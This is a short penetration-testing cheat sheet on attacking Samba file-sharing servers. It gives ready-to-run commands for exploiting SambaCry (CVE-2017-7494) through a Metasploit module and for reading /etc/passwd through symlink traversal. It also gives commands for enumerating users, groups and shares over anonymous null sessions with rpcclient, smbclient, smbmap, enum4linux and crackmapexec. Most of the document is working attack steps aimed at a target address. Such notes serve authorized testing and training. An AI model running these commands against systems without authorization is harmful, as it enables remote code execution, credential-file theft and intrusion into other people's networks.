# Samba (Exploits)

**What it is:** Open-source implementation of SMB/CIFS for Linux/Unix. Provides file sharing and Active Directory compatibility. SambaCry (CVE-2017-7494) is the most well-known exploit.

**Default ports:** 139, 445

**Vuln research:**
- [Samba Security Releases](https://www.samba.org/samba/security/)
- [SearchSploit: `searchsploit samba`](https://www.exploit-db.com/search?q=samba)

---


### SambaCry / EternalRed (CVE-2017-7494)

RCE on Samba 3.5.0 - 4.6.4 — Write access to any share required

```bash
smbclient -L //$IP/ -N
rpcclient -U "" -N $IP -c "srvinfo"

# Metasploit:
use exploit/linux/samba/is_known_pipename
set RHOSTS $IP
set SMB_SHARE_NAME <writable_share>
run
```

---

### Samba symlink traversal

Read files outside the share — If wide links enabled

```bash
smbclient //$IP/share -N
smb: \> symlink /etc/passwd passwd_link
smb: \> get passwd_link
```

---

### Samba username enumeration

Enumerate valid users without authentication

```bash
rpcclient -U "" -N $IP
rpcclient $> enumdomusers
rpcclient $> enumdomgroups
```

---

### Check for null sessions

Anonymous access to IPC$ — Enumerate everything

```bash
smbclient -L //$IP/ -N
smbmap -H $IP
enum4linux -a $IP
crackmapexec smb $IP -u '' -p '' --shares
```

---
